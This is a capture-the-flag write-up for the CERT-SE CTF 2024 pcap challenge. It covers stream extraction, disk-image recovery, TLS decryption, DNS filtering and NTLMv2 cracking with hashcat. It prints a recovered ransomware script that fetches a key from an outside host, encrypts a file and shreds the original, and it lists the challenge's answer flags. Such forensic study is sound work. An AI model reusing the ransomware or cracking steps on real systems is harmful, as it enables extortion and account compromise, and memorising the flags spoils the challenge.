#CTF
### Original file: CERT-SE_CTF2024.pcap

Identified ip/mac addresses on file:
An4lys3r/Employee 1: 	IP: 10.0.0.10 MAC: 52:54:00:16:f6:1f
D3f3nd3r/Employee 2: 	IP: 10.0.0.20 MAC: 52:54:00:11:19:a7
??: 			IP: 10.0.0.30 MAC: 52:54:00:52:dc:1f
Server?:		IP: 10.0.0.50 MAC: 52:54:00:6f:d7:65

Suspicious ip address: 195.200.72.82
FTP packets to presumed server shows the credentials to this server.
User: anonymous 
Pass: NcFTP@


#### Stream 0:

stream 0 and 1 are the same but 10.0.0.10 is involved in stream 1 and .20 in stream 0. .30 is involved in both.

Holds a conversation from employees discovering they have been hacked. Same on stream 1, only from the other employees perspective.

Found first flag on packet 1742.
Second on packet 4.

packet 147 the person in the datacenter sends over ransom note. /home/user/emergency_net/DCC/RANSOM_NOTE.gz
SHA-256 checksum to go along: 7113f236b43d1672d881c6993a8a582691ed4beb4c7d49befbceb1fddfb14909

Someone posted a wordlist scraped from their public website, and ranting about recording web traffic from workstation CTF-PC01.

IP they found suspicious. Involved in [[C2]] and exfiltration activities. 195.200.72.82

#### Stream 2:
ransom
#### Stream 3:
corp_net1.pcap file sent to .20

#### Stream 4:
Packet 391 seems to have something to do with programming c++ buffer error and an error from a python library.
Packet 394 is very strange. Maybe has something to do with c++?
Packet 384/977 has something about a puzzle.exe
Packet 981 has some more whatyoulookingat.com and also polisen.se
Encrypted data but at the bottom is alot of "whatyoulookingat.com".
Also packet 1030 has alot of windows directory from recycle bin. and also whatyoulookingat.com, cloudflare.net and sapo.se.cdn.
They seem to have extracted Recycle-Bin.zip here also.

Extracted corp_net1.pcap here.

#### Stream 5:

corp_net2.pcap file sent to .20

#### Stream 6:

Looking at stream 3 where a request was made to get corp_net2.pcap, packet that said "ok to send data" was nr. 1128se and first packet of stream 6 was 1132 I figured this was probably
that .pcap file so i saved it as raw data with file extention .pcap, I was correct.

#### Stream 7:

disk1.img.gz file is sent to .20

#### Stream 8:

extracted file disk1.img.gz. Altough it cannot be decompressed with winrar.

#### Stream 10:

Seems to be the wordlist. 
Extracted file.

Extracted file: corp_net2.pcap

Extracted file: disk1.img.gz

## File disk1.img.gz

It was corrupted, but using [[Pen testing tools#Gzrecover|gzrecover]] and then [[Pen testing tools#TestDisk|testDisk]] I was able to extract 4 files.
1. secret
2. secret.encrypted
3. sslkeylogfile
4. ransomware.sh
After inspecting the files I found that sslkeylogfile contained some ssl keys for TLS 1.3.
Ransomware.sh contained a shell script that encrypted secret using -aes-128-cbc cipher with [[Pen testing tools#Openssl|openssl]], outputting the secret.encrypt file and then shredded the secret file with 'shred' command before removing it and the sslkeylogfile.
### ransomware.sh
`#!/bin/bash 
`password=$(SSLKEYLOGFILE=sslkeylogfile curl --insecure https://whatyoulookingat.com/1.txt)
`openssl enc -aes-128-cbc -pass pass:$password -in secret -out secret.encrypted
`shred secret
`rm secret
`rm sslkeylogfile
`rm $0

The secret file is probably a lost cause, I will instead focus on cracking the secret.encrypt file since I know aes128 was used and the sslkeylogfile previously extracted is probably going to help me decrypt the traffic where the password was obtained from whatyoulookingat.com.

## ransomNote.gz

After neglecting this file I ran gzrecover on it and got a ASCII text file. But the file was corrupted. The checksum is wrong, the original conversation the had the checksum provided: 7113f236b43d1672d881c6993a8a582691ed4beb4c7d49befbceb1fddfb14909.

## corp_net1.pcap
### secret.encrypted

Here I found the password for the secret.encrypted file. Since I knew from the ransomware.sh script that the password was obtained from `whatyoulookingat.com/1.txt`, I searched for this as a regular expression in packet details. This led me to tcp stream 53 in this file. And packet 1920 had a payload of 17 bytes which had the password. 

	Password: pheiph0Xeiz8OhNa

Now I could decrypt the file. 
```
openssl enc -d -aes-128-cbc -in secret.encrypted -out secret.txt -pass pass:pheiph0Xeiz8OhNa
```
And in secret.txt was CTF\[OPPORTUNISTICALLY]

### puzzle.exe

After tls decryption of this file I found on stream 59 that puzzle.exe was extracted. This is most likely the file transmitted on stream 60.
This was correct, it is a puzzle.
Solved the puzzle, gave nothing, must be something more about it though. 

When I completed the puzzle I took a screenshot of it. Now looking back at it I see the flag next to Kalles face.

CTF\[HAPPY BIRTHDAY]

#### Reverse engineer
#SRE 
Running `file puzzle.exe` in [[SRE Tools#Git bash|gitbash]] tells that it is a `PE32+ excecutable (GUI) x86-64, for MS Windows, 6 sections.`

Decompiling with [[SRE Tools#IDA|IDA]]
There was no need for this.

### recycle-bin.zip

Stream 63 mentions transferring file Recycle-bin.zip. Extracted on stream 64.
The files seem to only reference where they where on the original computer. 
But there was an HFS HTTP file server .exe under the name $RL7SXXI.exe here where I could add the files and view them in the browser.

Alot of interesting files here. Might have to use IDA to see what $ID8WDX0.exe and $IL7SXXI.exe does because windows wont let me run it.

$RCXHUFJ.zip has NewFileTime.exe.

$RZ8ZSGB.zip holds file "Biografi" with 69 .txt files, each of 1kb size. All files is just one word of "Lorem ipsum" in order it seems.

$IZ8ZSGB.zip, $ICXHUFJ.zip, $IWOD8TX.zip is damaged, using gzrecover got me nowhere. They all have 0x00 0x02 as magic number in beginning of file.

Seems like recycle bin makes reference files so when it starts with `$I` it is just a reference file.

When sorting for date $R80Z3YX.txt is dated 1984-06-06. This is the birthdate for tetris which is a part of the puzzle.exe file on the puzzles computer. The file contains: 
`Jamborino Jamboro Archipelago Island Apple Horse`
`Monkey Dog`
`Kit Kat House Flower`

The metadata file of this file contains the original file path `C:\Users\aleksjej.pazjitnov\Downloads\INKEMW2QIVHFIT2NJFHE6U25.txt`.
**Alexey Pajitnov** was apparently the creator of tetris. The file name `INKEMW2QIVHFIT2NJFHE6U25` appears to be Base32 encoded. After decoding, found the flag:
CTF\[PENTOMINOS]

### archive

Stream 66 mentions transferring file archive. Extracted on 67.
Opening it with gunzip, winrar, etc does not work. Trying to recover it with gzrecover does not work.
Only thing that worked was 7zip. But not extracting it, only viewing it. So going deep into it, because it is nestled file after nestled file etc. Last one had a flag:
CTF\[IRRITATING]

### DNS

A lot of DNS messages that are suspicious. After inspecting these, I noticed some of them have only one A, and OPT at the end. The ones that were interesting were in base64 or base32. So the below filter filtered out all the unwanted frames. 

`ip.src == 192.168.137.28  && dns && dns.qry.type == 1 && !(dns.qry.name contains ".com" ||dns.qry.name contains ".org" || dns.qry.name contains ".tech" || dns.qry.name contains ".net" || dns.qry.name contains ".ms"|| dns.qry.name contains ".org" || dns.qry.name contains ".arpa"||  dns.qry.name contains ".se" )`

`dns.qry.type == 1 `  A flag is 1. 

From here, extract all the data to a csv file and then modify it to only have the names section (data).
## corp_net2.pcap
### unauthorized html

Stream 57 had an html file where something was unauthorized.

### NTLM packet 10639 - 10640


| Actor      | IPv6                      | MAC               | IPv4           |
| ---------- | ------------------------- | ----------------- | -------------- |
| Requesting | fe80::dcf6:cc94:c4f2:82c2 | a4:97:b1:f0:c8:fb | 192.168.200.57 |
| Recieving  | fe80::f786:f9ae:ab5d:43c9 | 00:0c:29:b0:0c:00 |                |

There are a lot of tries to authenticate traffic with NTLM. But the only one that was successful was packet 10639 indicated by packet 10640.
#### From Challenge packet
NTLM Server Challenge: fe26bf30955b64d7
#### From Auth packet
User Name: CTF
Domain: LAB
NTLM proof string: a406a1570d0391d358354bb21df7d12e 
NTLM Response without proof string: 0101000000000000158bece036fada0136c00153f7ab788b00000000020008004d00550044004a0001001e00570049004e002d0035004600560037004d004e0055004200410030004b00040014004d00550044004a002e004c004f00430041004c0003003400570049004e002d0035004600560037004d004e0055004200410030004b002e004d00550044004a002e004c004f00430041004c00050014004d00550044004a002e004c004f00430041004c000800300030000000000000000000000000200000fd6f62357ae25314e0b8f63ab17e5d1821479e68ec22e7ee70827eadb2f393200a001000000000000000000000000000000000000900200048005400540050002f00640063006300300031002e006c006f00630061006c000000000000000000
#### Hashcat
Saving the above values in the following format in a txt file:
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response

`hashcat -m 5600 ntlm.txt WORDLIST.txt`
Wordlist is the wordlist file obtained previously. In the conversation from beginning they mentioned the wordlist with the workstation `CTF-PC01` and the user name is CTF which indicates that this is a flag maybe. This is the reasoning behind trying this and cracking the password from this packet with this wordlist.

The password hashcat cracked was \[RHODE_ISLAND_Z].
### FLAGS:
**9 flags in total**
**8/9**

CTF\[E65D46AD10F92508F500944B53168930]
CTF\[AES128]
CTF\[OPPORTUNISTICALLY]
CTF\[IRRITATING]
\[RHODE_ISLAND_Z]
CTF\[TOPPALUA]
CTF\[HAPPY BIRTHDAY]
CTF\[PENTOMINOS]